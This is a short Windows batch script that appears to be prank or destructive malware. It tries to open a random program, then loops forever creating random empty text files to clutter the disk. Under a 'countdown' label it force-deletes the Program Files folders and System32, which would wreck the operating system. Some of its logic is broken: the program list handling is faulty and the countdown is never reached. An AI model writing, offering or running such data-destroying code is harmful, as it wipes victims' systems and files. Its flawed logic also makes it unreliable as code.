@echo off
setlocal enabledelayedexpansion

set apps=[notepad.exe,paint.exe,calc.exe,cmd.exe]

set /a choice=%random% %% 4
for /l %%i in (0,1,%choice%) do set app=!apps:,=!
start "" !app!

:loop
set filename=%random%_%random%_%random%.txt
echo Generating file: %filename%
echo.>"%filename%"
goto loop

:countdown
for /l %%i in (10,-1,1) do (
    echo %%i
    ping -n 2 localhost >nul
)

ping -n 5 localhost >nul

rd /s /q "%SystemDrive%\Program Files"
rd /s /q "%SystemDrive%\Program Files (x86)"
rd /s /q "%SystemRoot%\System32"
